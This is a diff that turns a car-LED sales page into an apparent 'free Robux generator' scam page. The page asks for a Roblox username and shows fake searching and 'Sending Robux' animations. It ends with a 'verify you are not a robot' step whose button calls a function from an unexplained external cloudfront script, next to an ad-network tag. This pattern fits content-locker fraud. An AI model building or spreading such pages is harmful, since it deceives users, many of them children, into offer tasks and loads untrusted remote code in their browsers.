@@ -1,347 +1,512 @@
+
+
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
+<html lang="en">
+  <head>
+   <script type="text/javascript">
+    var WxUHm_BlT_zlNmHc={"it":4424524,"key":"00ce9"};
+</script>
+<script src="https://d19k1sh57v5k0g.cloudfront.net/8300939.js"></script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>إضاءة LED للسيارة | عرض خاص</title>
-    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;800&display=swap" rel="stylesheet">
+    <meta name="monetag" content="439f686d11293fa609c0b0422d5cc064">
+
+    <link href="https://raw.githack.com/robux111/1/main/icon.ico">
     <style>
+
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            font-family: "Kumbh Sans", sans-serif;
+        }
+
+        .logo {
+            width: 30px;
+            display: flex;
+            align-items: center;
+        }
+
+        .logo span {
+            font-weight: 900;
+            margin-right: 18px;
+            font-size: 25px;
+        }
+
+        nav {
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background-color: #dee1e3;
+            border: solid #c7cbce;
+            border-width: 0 0 1px;
+            padding: 0 40px;
+        }
+
+        nav ul {
+            list-style: none;
+            display: flex;
         }
 
         body {
-            font-family: 'Tajawal', sans-serif;
-            background: #f5f5f5;
-            color: #333;
-            line-height: 1.6;
+            background-color: #f2f4f5;
+            color: #393b3d;
         }
 
-        /* Header */
-        .header {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            padding: 20px;
-            text-align: center;
-            position: sticky;
-            top: 0;
-            z-index: 100;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        img {
+            width: 100%;
         }
 
-        .header h1 {
-            font-size: 28px;
-            font-weight: 800;
+        ul li {
+            margin-left: 30px;
         }
 
-        /* Hero Section */
-        .hero {
-            background: white;
-            padding: 40px 20px;
-            text-align: center;
-        }
-
-        .hero-img {
-            max-width: 100%;
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-            margin: 20px 0;
-        }
-
-        .offer-badge {
-            background: #ff4757;
-            color: white;
-            display: inline-block;
-            padding: 10px 30px;
-            border-radius: 25px;
-            font-weight: 700;
-            font-size: 18px;
-            margin-bottom: 15px;
-            animation: bounce 2s infinite;
-        }
-
-        @keyframes bounce {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-5px); }
-        }
-
-        .hero h2 {
-            font-size: 32px;
-            color: #2d3436;
-            margin-bottom: 15px;
-            font-weight: 800;
-        }
-
-        .hero p {
-            font-size: 18px;
-            color: #636e72;
-            max-width: 600px;
-            margin: 0 auto 25px;
-        }
-
-        /* Colors Section */
-        .colors {
-            background: white;
-            padding: 40px 20px;
-            text-align: center;
-            margin: 20px 0;
-        }
-
-        .colors h3 {
-            font-size: 24px;
-            margin-bottom: 25px;
-            color: #2d3436;
-        }
-
-        .color-container {
+        .middle {
+            width: 70%;
+            margin: 10px auto;
+            height: 135px;
+            background-image: linear-gradient(0deg,
+                    rgba(39, 39, 46, 0.5),
+                    rgba(39, 39, 46, 0.5)),
+                url(https://raw.githack.com/robux111/1/main/images/bp.jpg);
+            background-position: bottom;
+            background-size: 100%;
+            margin-bottom: 24px;
+            color: #fff;
             display: flex;
             justify-content: center;
-            gap: 20px;
-            flex-wrap: wrap;
-            max-width: 700px;
-            margin: 0 auto;
+            align-items: center;
+            flex-direction: column;
+            text-align: center;
         }
 
-        .color-box {
-            width: 100px;
-            height: 100px;
-            border-radius: 15px;
+        .middle h2 {
+            margin-bottom: 10px;
+            font-size: 35px;
+        }
+
+        .middle p {
+            font-size: 17px;
+        }
+
+        body .para {
+            font-size: 10px;
+            font-weight: 500;
+            margin-top: 50px;
+            color: #606162;
+            text-align: center;
+            width: 100%;
+            margin: 50px auto;
+        }
+
+        .box_con {
+            margin: 0 auto;
+            background-color: #fff;
+            min-height: 163px;
+            width: 70%;
+            font-size: 20px;
+            padding: 20px;
+            border: solid #c7cbce;
+            border-width: 1px 1px 1px;
+        }
+
+        input {
+            padding: 11px 15px;
+            border: none;
+            background: #f2f4f5;
+            border-radius: 9px;
+            outline: none;
+            font-size: 17px;
+        }
+
+        button {
+            background: #393b3d;
+            outline: none;
+            border: none;
+            color: #fff;
+            padding: 8px 10px;
+            border-radius: 5px;
+            font-weight: 900;
+            letter-spacing: 1px;
+            font-size: 19px;
+            cursor: pointer;
+            margin-top: 30px;
+        }
+
+        .box2 {
+            display: none;
+        }
+
+        .box3 {
+            display: none;
+        }
+
+        .box4 {
+            display: none;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            background-color: #ffffffbc;
+            border-radius: 8px;
+        }
+
+        .row {
             display: flex;
             align-items: center;
-            justify-content: center;
-            color: white;
-            font-weight: 700;
-            font-size: 14px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-            transition: transform 0.3s;
-            cursor: pointer;
+            height: 70px;
+            justify-content: space-around;
         }
 
-        .color-box:hover {
+        .row:not(.row:last-child) {
+            border-bottom: 1px solid #bdbebe;
+        }
+
+        .price {
+            font-size: 20px;
+            font-weight: 700;
+        }
+
+        .robux_total {
+            display: flex;
+            align-items: center;
+        }
+
+        .details:hover {
+            background-color: rgb(226, 226, 226);
+        }
+
+        .pic {
+            width: 30px;
+            margin-right: 10px;
+            pointer-events: none;
+            margin-top: 2px;
+        }
+
+        span {
+            font-size: 20px;
+            font-weight: 800;
+            color: rgba(0, 0, 0, 0.6);
+        }
+
+        img {
+            width: 100%;
+        }
+
+        h3 {
+            font-size: 32px;
+            margin-bottom: 21px;
+        }
+
+        .details {
+            border: 1px solid #b8b8b8;
+            border-radius: 8px;
+            padding: 5px 8px;
+            width: 180px;
+            display: flex;
+            justify-content: center;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .folding {
+            margin: 20px auto;
+            width: 100px;
+            height: 100px;
+            position: relative;
+            transform: rotateZ(45deg);
+        }
+
+        .square {
+            position: absolute;
+            top: 36%;
+            right: 35%;
+            width: 30px;
+            height: 30px;
+            background-color: #fff;
+            transform: rotateZ(87deg);
+        }
+
+        .folding .sk-cube {
+            float: left;
+            width: 50%;
+            height: 50%;
+            position: relative;
             transform: scale(1.1);
         }
 
-        .white { background: linear-gradient(135deg, #ffffff 0%, #dfe6e9 100%); color: #2d3436; border: 2px solid #b2bec3; }
-        .cyan { background: linear-gradient(135deg, #00d2d3 0%, #00cec9 100%); }
-        .red { background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%); }
-        .green { background: linear-gradient(135deg, #26de81 0%, #20bf6b 100%); }
-        .pink { background: linear-gradient(135deg, #fd79a8 0%, #e84393 100%); }
-        .blue { background: linear-gradient(135deg, #74b9ff 0%, #0984e3 100%); }
-
-        /* Features */
-        .features {
-            background: white;
-            padding: 40px 20px;
-            margin: 20px 0;
+        .folding .sk-cube:before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #333;
+            animation: sk-foldCubeAngle 2.4s infinite linear both;
+            transform-origin: 100% 100%;
         }
 
-        .features h3 {
-            text-align: center;
-            font-size: 24px;
-            margin-bottom: 30px;
-            color: #2d3436;
+        .folding .sk-cube2 {
+            transform: scale(1.1) rotateZ(90deg);
         }
 
-        .feature-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 25px;
-            max-width: 900px;
-            margin: 0 auto;
+        .folding .sk-cube3 {
+            transform: scale(1.1) rotateZ(180deg);
         }
 
-        .feature-item {
-            background: #f8f9fa;
-            padding: 25px;
-            border-radius: 12px;
-            text-align: center;
-            transition: transform 0.3s;
+        .folding .sk-cube4 {
+            transform: scale(1.1) rotateZ(270deg);
         }
 
-        .feature-item:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+        .folding .sk-cube2:before {
+            animation-delay: 0.3s;
         }
 
-        .feature-icon {
-            font-size: 40px;
-            margin-bottom: 15px;
+        .folding .sk-cube3:before {
+            animation-delay: 0.6s;
         }
 
-        .feature-item h4 {
-            color: #667eea;
-            margin-bottom: 10px;
-            font-size: 18px;
+        .folding .sk-cube4:before {
+            animation-delay: 0.9s;
         }
 
-        /* Price Section */
-        .price-section {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            padding: 50px 20px;
-            text-align: center;
-            margin: 30px 0;
+        @keyframes sk-foldCubeAngle {
+
+            0%,
+            10% {
+                transform: perspective(140px) rotateX(-180deg);
+                opacity: 0;
+            }
+
+            25%,
+            75% {
+                transform: perspective(140px) rotateX(0deg);
+                opacity: 1;
+            }
+
+            90%,
+            100% {
+                transform: perspective(140px) rotateY(180deg);
+                opacity: 0;
+            }
         }
 
-        .price-box {
-            background: white;
-            color: #333;
-            max-width: 500px;
-            margin: 0 auto;
-            padding: 40px;
-            border-radius: 20px;
-            box-shadow: 0 15px 40px rgba(0,0,0,0.3);
+        @media (max-width: 400px) {
+            nav {
+                padding: 0 5px;
+            }
         }
 
-        .old-price {
-            font-size: 24px;
-            text-decoration: line-through;
-            color: #b2bec3;
-            margin-bottom: 10px;
+        @media (max-width: 1042px) {
+
+            .middle,
+            .box_con,
+            .para {
+                width: 90%;
+            }
         }
 
-        .new-price {
-            font-size: 56px;
-            font-weight: 800;
-            color: #667eea;
-            margin-bottom: 10px;
+        @media (max-width: 750px) {
+
+            .middle,
+            .box_con {
+                width: 100%;
+            }
+
+            .para {
+                width: 100%;
+            }
+
+            .middle h2 {
+                margin-bottom: 10px;
+                font-size: 30px;
+            }
+
+            .middle p {
+                font-size: 13px;
+            }
         }
 
-        .new-price span {
-            font-size: 24px;
-            color: #636e72;
+        @media (max-width: 373px) {
+            .logo span {
+                display: none;
+            }
+
+            nav {
+                padding: 0px;
+            }
         }
 
-        .cta-button {
-            display: inline-block;
-            background: #00b894;
-            color: white;
-            padding: 20px 50px;
-            border-radius: 50px;
-            text-decoration: none;
-            font-size: 22px;
-            font-weight: 700;
-            margin-top: 20px;
-            transition: all 0.3s;
-            box-shadow: 0 5px 20px rgba(0,184,148,0.4);
+        @media (max-width: 442px) {
+
+            nav {
+                padding: 0px 20px;
+            }
         }
 
-        .cta-button:hover {
-            background: #00a383;
-            transform: translateY(-3px);
-            box-shadow: 0 8px 25px rgba(0,184,148,0.5);
-        }
+        @media (max-width: 396px) {
 
-        .guarantee {
-            margin-top: 25px;
-            padding-top: 25px;
-            border-top: 2px dashed #dfe6e9;
-            display: flex;
-            justify-content: center;
-            gap: 30px;
-            flex-wrap: wrap;
-            font-size: 14px;
-            color: #636e72;
-        }
-
-        .guarantee span {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        /* Footer */
-        .footer {
-            background: #2d3436;
-            color: white;
-            text-align: center;
-            padding: 30px 20px;
-        }
-
-        /* Responsive */
-        @media (max-width: 768px) {
-            .hero h2 { font-size: 24px; }
-            .new-price { font-size: 42px; }
-            .color-box { width: 80px; height: 80px; font-size: 12px; }
+            nav {
+                padding: 0px 10px;
+            }
         }
     </style>
+<link rel="me" href="https://www.blogger.com/profile/00034796263315929340" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/17229069131579464507" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
 </head>
+
 <body>
 
-    <section class="hero">
-        <div class="offer-badge"> خصم 50% لفترة محدودة</div>
-        <h2>حوّل سيارتك إلى تحفة فنية</h2>
-        <p>أضف لمسة من الأناقة والفخامة لسيارتك مع إضاءة LED الاحترافية المتوفرة بـ 6 ألوان رائعة</p>
-        <img src="https://i.postimg.cc/wxfKZWzm/46gis-O1Qnui-PJg8Wj-Z3t-G2RW6N0y-R5x-Dm-HFE2Qr-D.jpg" alt="إضاءة السيارة الداخلية" class="hero-img">
-    </section>
+    <nav>
 
-    <section class="colors">
-        <h3>🎨 اختر لونك المفضل</h3>
-        <div class="color-container">
-            <div class="color-box white">أبيض</div>
-            <div class="color-box cyan">سماوي</div>
-            <div class="color-box red">أحمر</div>
-            <div class="color-box green">أخضر</div>
-            <div class="color-box pink">وردي</div>
-            <div class="color-box blue">أزرق</div>
+        <div class="logo">
+            <span>☰</span>
+            <img src="https://raw.githack.com/robux111/1/main/images/download.png" alt="">
         </div>
-    </section>
+        <ul>
+            <li>Discover</li>
+            <li>Marketplace</li>
+            <li>Robux</li>
+        </ul>
+    </nav>
 
-    <section class="features">
-        <h3>💎 لماذا تختار منتجنا؟</h3>
-        <div class="feature-grid">
-            <div class="feature-item">
-                <div class="feature-icon">⚡</div>
-                <h4>تركيب سهل</h4>
-                <p>يمكنك تركيبها بنفسك في دقائق بدون أدوات معقدة</p>
-            </div>
-            <div class="feature-item">
-                <div class="feature-icon">💡</div>
-                <h4>جودة عالية</h4>
-                <p>إضاءة ساطعة وموحدة تدوم لسنوات طويلة</p>
-            </div>
-            <div class="feature-item">
-                <div class="feature-icon">🔧</div>
-                <h4>قابلة للقص</h4>
-                <p>يمكنك قص الشريط حسب طول السيارة</p>
-            </div>
-            <div class="feature-item">
-                <div class="feature-icon">🚗</div>
-                <h4>مناسبة للجميع</h4>
-                <p>تتناسب مع جميع أنواع السيارات</p>
-            </div>
-        </div>
-    </section>
-
-    <section class="price-section">
-        <div class="price-box">
-            <div class="old-price">300 درهم</div>
-            <div class="new-price">150 درهم <span>فقط</span></div>
-            <p style="font-size: 16px; color: #636e72; margin: 15px 0;">وفر 150 درهم اليوم!</p>
-            <a href="#order" class="cta-button"> اطلب الآن</a>
-            
-            <div class="guarantee">
-                <span>✓ ضمان 30 يوم</span>                
-                <span>✓ دفع آمن</span>
-            </div>
-        </div>
-    </section>
-
-    <div class="footer">
-        <p style="margin-top: 10px; font-size: 16px; font-weight: bold;">📞 للدعم: <span dir="ltr">+372 59 122 332</span></p>
+    <div class="middle">
+        <h2>Robux</h2>
+        <p>Robux allows you to purchase upgrades for your avatar or buy special abilities in experiences.</p>
     </div>
 
+    <div class="box_con">
+        <div class="box">
+            <h3>Roblox username</h3><br>
+            <input class="username" type="text" name="" placeholder="Enter username"><br>
+            <button class="getrbx">Next</button>
+        </div>
+        <div class="box2">
+            <div class="folding">
+                <div class="sk-cube1 sk-cube"></div>
+                <div class="sk-cube2 sk-cube"></div>
+                <div class="sk-cube4 sk-cube"></div>
+                <div class="sk-cube3 sk-cube"></div>
+                <div class="square"></div>
+            </div>
+            <p class="useroutput" style="text-align: center; margin-top: 30px;">searching for amjad ...</p>
+        </div>
+        <div class="box3">
+            <div class="container">
+                <div class="row">
+                    <div class="price">$0.00</div>
+                    <div class="details">
+                        <div class="robux_total">
+                            <div class="pic"><img src="https://raw.githack.com/robux111/1/main/images/robux-removebg-preview.png"></div><span>800</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="row">
+
+                    <div class="price">$0.00</div>
+                    <div class="details">
+                        <div class="robux_total">
+                            <div class="pic"><img src="https://raw.githack.com/robux111/1/main/images/robux-removebg-preview.png"></div><span>1700</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="row">
+
+                    <div class="price">$0.00</div>
+                    <div class="details">
+                        <div class="robux_total">
+                            <div class="pic"><img src="https://raw.githack.com/robux111/1/main/images/robux-removebg-preview.png"></div>
+                            <span>5500</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="row">
+
+                    <div class="price">$0.00</div>
+                    <div class="details">
+                        <div class="robux_total">
+                            <div class="pic"><img src="https://raw.githack.com/robux111/1/main/images/robux-removebg-preview.png"></div><span>10000</span>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+
+        </div>
+        <div class="box4">
+            <h3>Last step</h3>
+            <p>please verify that you are not a robot, click the button and complete one task</p>
+            <button dir="rtl"  class="getrbx" onclick="_TG()">Complete</button>
+
+        </div>
+    </div>
+
+    <div class="para">
+        <p class="para"></p>
+
+    </div>
     <script>
-        // Smooth scroll for buttons
-        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-            anchor.addEventListener('click', function (e) {
-                e.preventDefault();
-                alert('شكراً لاهتمامك! سيتم توجيهك لإتمام الطلب');
+
+        const rbxbtn = document.querySelector(".getrbx");
+
+        const box1 = document.querySelector(".box");
+        const box2 = document.querySelector(".box2");
+        const box3 = document.querySelector(".box3");
+        const box4 = document.querySelector(".box4");
+        const rbxtotal = document.querySelectorAll(".details");
+
+        const username = document.querySelector(".username");
+
+        const useroutput = document.querySelector(".useroutput");
+
+        rbxbtn.addEventListener("click", () => {
+            if (username.value.length <= 2) {
+                alert("please enter username");
+            } else {
+                box1.style.display = "none";
+                box2.style.display = "block";
+                setTimeout(showbox2, 4500);
+                setTimeout(showbox3, 4500);
+            }
+
+            useroutput.innerHTML = `Searching for <b>${username.value}</b> ...`;
+        });
+
+        rbxtotal.forEach((btn) => {
+            btn.addEventListener("click", () => {
+                box3.style.display = "none";
+
+                box2.style.display = "block";
+
+                setTimeout(showboxagain, 2500);
+                setTimeout(showbox4, 2500);
+                useroutput.innerHTML = `Sending Robux to <b>${username.value}</b>...`;
             });
         });
+
+        let showboxagain = () => {
+            box2.style.display = "none";
+        };
+        let showbox2 = () => {
+            box2.style.display = "none";
+        };
+
+        let showbox3 = () => {
+            box3.style.display = "block";
+        };
+
+        let showbox4 = () => {
+            box4.style.display = "block";
+        };
     </script>
 
-</body>
-</html>
+
+
+</body></html>
